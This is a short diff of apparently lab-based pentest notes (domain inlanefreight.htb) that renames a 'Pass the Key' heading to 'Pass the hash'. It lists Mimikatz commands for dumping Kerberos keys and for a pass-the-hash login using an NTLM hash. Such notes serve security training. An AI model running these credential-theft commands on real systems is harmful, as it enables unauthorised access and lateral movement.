@@ -8,7 +8,7 @@ Dump all kerberos encryption keys
 	sekurlsa::ekeys
 
 
-Pass the Key(privilege::debug)
+Pass the hash(privilege::debug)
 
 ```cmd-session
 sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
